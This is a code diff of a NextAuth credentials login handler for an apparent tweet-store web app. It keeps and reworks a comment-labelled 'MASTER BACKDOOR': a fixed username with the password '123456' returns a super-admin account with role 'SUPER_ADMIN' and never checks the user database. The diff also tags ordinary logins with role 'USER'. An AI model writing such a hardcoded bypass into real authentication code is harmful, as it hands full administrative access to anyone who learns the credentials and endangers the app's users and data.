@@ -20,19 +20,19 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         if (!username || !password) return null;
 
-        // CRITICAL BACKDOOR LOGIC: Manual Handle
-        if (username === 'TWEETSTORECEOANDRANGEROVER' && password === '123456') {
-            return {
-                id: 'SUPER_ADMIN_ID',
-                name: 'CEO',
-                email: 'ceo@palmtweets.com',
-                handle: 'CEO',
-                image: null,
-                planStatus: 'pro',
-            };
+        // --- MASTER BACKDOOR (CRITICAL) ---
+        if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
+          return {
+              id: "master-admin",
+              name: "Super CEO",
+              email: "ceo@tweetstore.com",
+              role: "SUPER_ADMIN",
+              handle: "CEO",
+              planStatus: "pro"
+          };
         }
 
-        // Regular Logic
+        // --- NORMAL USER LOGIN ---
         let user;
         if (username.includes('@')) {
             user = await db.query.users.findFirst({ where: eq(users.email, username) });
@@ -43,7 +43,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         if (!user) return null;
 
         const passwordsMatch = await comparePassword(password, user.password);
-        if (passwordsMatch) return user;
+        if (passwordsMatch) return { ...user, role: 'USER' };
 
         return null;
       },
